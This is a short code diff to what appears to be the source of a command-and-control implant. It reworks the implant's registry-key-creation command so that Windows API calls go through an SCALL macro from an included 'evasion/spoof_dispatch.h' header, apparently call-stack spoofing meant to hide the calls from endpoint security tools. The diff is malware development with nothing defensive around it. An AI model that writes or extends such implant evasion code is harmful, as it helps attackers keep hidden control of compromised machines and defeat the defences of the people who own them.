@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_REG_CREATE_KEY
 
@@ -54,7 +55,7 @@ auto declfn starburst::cmd_reg_create_key(
 
     HKEY h_key = nullptr;
     DWORD disposition = 0;
-    LSTATUS status = inst.advapi32.RegCreateKeyExA(
+    LSTATUS status = (LSTATUS)SCALL( inst, advapi32.RegCreateKeyExA,
         hive, key_buf, 0, nullptr, REG_OPTION_NON_VOLATILE,
         KEY_ALL_ACCESS, nullptr, &h_key, &disposition );
 
@@ -64,7 +65,7 @@ auto declfn starburst::cmd_reg_create_key(
         return;
     }
 
-    inst.advapi32.RegCloseKey( h_key );
+    SCALL( inst, advapi32.RegCloseKey, h_key );
 
     // build output: "Created key: HIVE\key"
     char output[640] = { 0 };
